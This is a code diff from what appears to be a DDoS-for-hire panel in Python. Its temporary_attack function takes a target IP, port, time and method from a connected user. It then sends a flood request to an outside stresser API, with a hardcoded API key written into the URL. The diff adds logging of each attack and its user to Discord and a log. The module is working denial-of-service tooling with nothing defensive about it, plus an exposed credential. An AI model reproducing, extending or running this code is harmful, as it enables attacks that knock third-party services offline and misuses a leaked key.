@@ -2,7 +2,10 @@ import os, sys, time, requests, socket
 from urllib.parse import urlparse
 
 from ..utils.main import *
+from ..Logger.main import *
+from ..Logger.discord import *
 from ..Config.main import *
+
 
 def uri_exists_get(uri: str) -> bool:
     try:
@@ -39,6 +42,8 @@ def temporary_attack(socket, argv):
                 socket.send("Sending attack, please wait....\r\n".encode())
                 send = requests.get(f"https://api.supremesecurity.cz/sst/api?service=flood&key=3gks8shg112099z&host={ip}&port={port}&time={time}&method={method}&network=1").text
                 print(send) # WHY ARE WE PRINTING RESPONSE ????
+                Discord.send_attack(f"New Attack Sent!\r\n[User]: {Strings.CurrentUser} | CMD: {argv}")
+                LogTypes.LogAttack(f"('{Strings.Current}','{argv}')")
                 socket.send(f"Attack sent to: {ip}:{port} for {time} seconds with {method}\r\n".encode())
             else:
                 socket.send("Sorry But You Need To Provide A Real Ip Or Url\r\n".encode())
